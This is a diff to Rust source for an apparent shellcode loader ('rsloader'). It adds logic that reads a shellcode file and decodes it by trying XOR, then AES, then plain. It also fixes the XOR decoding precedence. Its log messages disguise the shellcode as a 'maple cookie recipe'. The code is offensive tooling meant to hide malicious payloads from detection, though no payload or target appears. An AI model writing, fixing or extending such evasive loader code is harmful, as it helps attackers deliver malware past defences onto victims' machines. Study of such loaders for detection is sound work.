@@ -37,7 +37,20 @@ pub struct AESShellCode {
 }
 
 impl ShellCode {
-    pub fn from_file(input_path: &str, mode: &str) -> anyhow::Result<ShellCode> {
+
+    pub fn from_file(input_path: &str) -> rsloader::ShellCode {
+        let sc_object = match rsloader::ShellCode::import_sc(input_path, "xor") {
+            Ok(my_xor_object) => my_xor_object,
+            Err(_) => match rsloader::ShellCode::import_sc(input_path, "aes") {
+                Ok(my_aes_object) => my_aes_object,
+                Err(_) => rsloader::ShellCode::import_sc(input_path, "plain").unwrap(),
+            },
+        };
+    
+        sc_object
+    }
+    
+    fn import_sc(input_path: &str, mode: &str) -> anyhow::Result<ShellCode> {
         let shellcode = match std::fs::read(input_path) {
             Ok(result) => result,
             Err(error) => {
@@ -59,15 +72,14 @@ impl ShellCode {
                 println!(
                     "[+] la recette du cookie à l'érable a été détectée comme étant cryptée AES"
                 );
-                let decoded_aes_object: AESShellCode =
-                    bincode::deserialize(&shellcode)?;
+                let decoded_aes_object: AESShellCode = bincode::deserialize(&shellcode)?;
                 Ok(decoded_aes_object.decrypt())
             }
             "plain" => {
                 println!("[+] la recette des biscuits à l'érable must be raw/normal");
                 Ok(ShellCode { sc: shellcode })
-            },
-            &_ => todo!()
+            }
+            &_ => todo!(),
         }
     }
 
@@ -113,7 +125,7 @@ impl XoredShellCode {
         }
 
         XoredShellCode {
-            xor_key: xor_key,
+            xor_key,
             sc: ShellCode {
                 sc: xored_shellcode,
             },
@@ -130,7 +142,7 @@ impl XoredShellCode {
         for xor_char in self.xor_key.chars() {
             if xor_char != ' ' {
                 for (index, value) in self.sc.sc.iter().enumerate() {
-                    std::mem::replace(&mut xored_shellcode[index], value ^ xor_char as u8 - b'0');
+                    std::mem::replace(&mut xored_shellcode[index], value ^ (xor_char as u8 - b'0'));
                 }
             }
         }
@@ -143,7 +155,6 @@ impl XoredShellCode {
     pub fn output_to_file(self, output_path: &str) {
         let serialized_self = bincode::serialize(&self).unwrap();
 
-        println!("{:?}", serialized_self); // DEBUG
         let mut file = match OpenOptions::new()
             .write(true)
             .create_new(true)
@@ -183,10 +194,7 @@ impl AESShellCode {
         cipher.encrypt_in_place(nonce, &rand_assoc_data, &mut sc_copy.sc);
 
         println!("[+] cryptant la recette des cookies à l'érable en utilisant AES");
-        println!(
-            "[+] key: (first 5 bytes) {:#04X?}",
-            key.clone()[0..5].to_vec()
-        );
+        println!("[+] key: (first 5 bytes) {:#04X?}", key[0..5].to_vec());
         println!(
             "[+] nonce: (first 5 bytes) {:#04X?}",
             rand_nonce.clone()[0..5].to_vec()
